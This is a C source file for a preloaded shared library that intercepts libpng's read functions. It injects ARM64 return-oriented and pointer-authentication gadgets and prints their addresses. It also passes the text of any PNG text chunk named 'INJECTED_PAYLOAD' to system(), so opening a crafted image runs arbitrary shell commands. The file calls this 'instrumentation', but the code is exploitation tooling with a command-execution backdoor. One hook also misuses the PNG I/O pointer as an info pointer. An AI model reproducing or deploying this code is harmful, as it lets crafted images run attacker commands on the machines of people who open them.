#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <png.h>

// Original function pointers
static png_structp (*real_png_create_read_struct)(png_const_charp user_png_ver, png_voidp error_ptr, png_error_ptr error_fn, png_error_ptr warn_fn) = NULL;
static void (*real_png_read_info)(png_structp png_ptr, png_infop info_ptr) = NULL;
static void (*real_png_read_image)(png_structp png_ptr, png_bytepp image) = NULL;
static void (*real_png_read_end)(png_structp png_ptr, png_infop info_ptr) = NULL;

// Global payload buffer for injected payloads
uint64_t global_injected_payload[512] __attribute__((aligned(16)));
char injected_command[1024];

// Instrumentation gadgets for enhanced exploitation
void injected_gadget_pop_x0_x1_ret() {
    asm volatile(
        "ldp x0, x1, [sp], #16\n\t"
        "ret"
    );
}

void injected_gadget_ldr_x0_x1_br_x0() {
    asm volatile(
        "ldr x0, [x1]\n\t"
        "br x0"
    );
}

void injected_gadget_vop_ldr_str_q0_ret() {
    asm volatile(
        "ldr q0, [x1]\n\t"
        "str q0, [x0]\n\t"
        "ret"
    );
}

// Additional PAC-aware gadgets
void injected_gadget_pacia_x30() {
    asm volatile("pacia x30, sp");
}

void injected_gadget_autia_x30() {
    asm volatile("autia x30, sp");
}

void injected_gadget_ldraa_x0_x1() {
    asm volatile("ldraa x0, [x1]");
}

void injected_gadget_blraa_x0() {
    asm volatile("blraa x0");
}

// More VOP gadgets
void injected_gadget_vop_ldr_d0_x1() {
    asm volatile(
        "ldr d0, [x1]\n\t"
        "ret"
    );
}

void injected_gadget_vop_str_d0_x0() {
    asm volatile(
        "str d0, [x0]\n\t"
        "ret"
    );
}

// Payload execution function
void execute_injected_payload() {
    if (injected_command[0] != '\0') {
        printf("INJECTED PAYLOAD EXECUTION: %s\n", injected_command);
        fflush(stdout);
        system(injected_command);
    }
}

// Hook png_create_read_struct to inject our instrumentation
png_structp png_create_read_struct(png_const_charp user_png_ver, png_voidp error_ptr, png_error_ptr error_fn, png_error_ptr warn_fn) {
    if (!real_png_create_read_struct) {
        real_png_create_read_struct = dlsym(RTLD_NEXT, "png_create_read_struct");
    }

    void *result = real_png_create_read_struct(user_png_ver, error_ptr, error_fn, warn_fn);

    // Inject our gadgets into the process
    printf("INSTRUMENTATION: Injected gadgets into %s (PID: %d)\n", getenv("_") ? getenv("_") : "unknown", getpid());
    printf("INJECTED_GADGET pop_x0_x1_ret: %p\n", injected_gadget_pop_x0_x1_ret);
    printf("INJECTED_GADGET ldr_x0_x1_br_x0: %p\n", injected_gadget_ldr_x0_x1_br_x0);
    printf("INJECTED_GADGET vop_ldr_str_q0: %p\n", injected_gadget_vop_ldr_str_q0_ret);
    printf("INJECTED_GADGET pacia_x30: %p\n", injected_gadget_pacia_x30);
    printf("INJECTED_GADGET autia_x30: %p\n", injected_gadget_autia_x30);
    printf("INJECTED_GADGET ldraa_x0_x1: %p\n", injected_gadget_ldraa_x0_x1);
    printf("INJECTED_GADGET blraa_x0: %p\n", injected_gadget_blraa_x0);
    printf("INJECTED_GADGET vop_ldr_d0_x1: %p\n", injected_gadget_vop_ldr_d0_x1);
    printf("INJECTED_GADGET vop_str_d0_x0: %p\n", injected_gadget_vop_str_d0_x0);
    printf("INJECTED_PAYLOAD_BUFFER: %p\n", global_injected_payload);
    fflush(stdout);

    return result;
}

// Hook png_read_info to check for payload chunks
void png_read_info(png_structp png_ptr, png_infop info_ptr) {
    if (!real_png_read_info) {
        real_png_read_info = dlsym(RTLD_NEXT, "png_read_info");
    }

    real_png_read_info(png_ptr, info_ptr);

    // Check for injected payload in text chunks
    png_textp text_ptr;
    int num_text;
    if (png_get_text(png_ptr, info_ptr, &text_ptr, &num_text)) {
        for (int i = 0; i < num_text; i++) {
            if (strcmp(text_ptr[i].key, "INJECTED_PAYLOAD") == 0) {
                strncpy(injected_command, text_ptr[i].text, sizeof(injected_command) - 1);
                // Execute payload immediately when found
                execute_injected_payload();
            }
        }
    }
}

// Hook png_read_image to trigger payload execution on overflow conditions
void png_read_image(png_structp png_ptr, png_bytepp image) {
    if (!real_png_read_image) {
        real_png_read_image = dlsym(RTLD_NEXT, "png_read_image");
    }

    real_png_read_image(png_ptr, image);

    // Check for overflow conditions and execute payload
    png_infop info_ptr = png_get_io_ptr(png_ptr);
    if (info_ptr) {
        png_uint_32 width = png_get_image_width(png_ptr, info_ptr);
        png_uint_32 height = png_get_image_height(png_ptr, info_ptr);

        // Trigger on suspiciously large images (potential overflow)
        if (width > 100000 || height > 100000) {
            printf("INSTRUMENTATION: Large image detected, executing injected payload\n");
            fflush(stdout);
            execute_injected_payload();
        }
    }
}

// Hook png_read_end to finalize instrumentation
void png_read_end(png_structp png_ptr, png_infop info_ptr) {
    if (!real_png_read_end) {
        real_png_read_end = dlsym(RTLD_NEXT, "png_read_end");
    }

    real_png_read_end(png_ptr, info_ptr);

    // Final payload execution check
    if (injected_command[0] != '\0') {
        printf("INSTRUMENTATION: Final payload execution\n");
        fflush(stdout);
        execute_injected_payload();
    }
}

// Constructor to initialize instrumentation
__attribute__((constructor)) void init_instrumentation() {
    printf("INSTRUMENTATION: Shared object loaded into process %d\n", getpid());
    printf("INSTRUMENTATION: Available gadgets:\n");
    printf("  - injected_gadget_pop_x0_x1_ret\n");
    printf("  - injected_gadget_ldr_x0_x1_br_x0\n");
    printf("  - injected_gadget_vop_ldr_str_q0_ret\n");
    printf("  - injected_gadget_pacia_x30\n");
    printf("  - injected_gadget_autia_x30\n");
    printf("  - injected_gadget_ldraa_x0_x1\n");
    printf("  - injected_gadget_blraa_x0\n");
    printf("  - injected_gadget_vop_ldr_d0_x1\n");
    printf("  - injected_gadget_vop_str_d0_x0\n");
    printf("  - execute_injected_payload function\n");
    fflush(stdout);
}

// Destructor for cleanup
__attribute__((destructor)) void cleanup_instrumentation() {
    printf("INSTRUMENTATION: Shared object unloaded\n");
    fflush(stdout);
}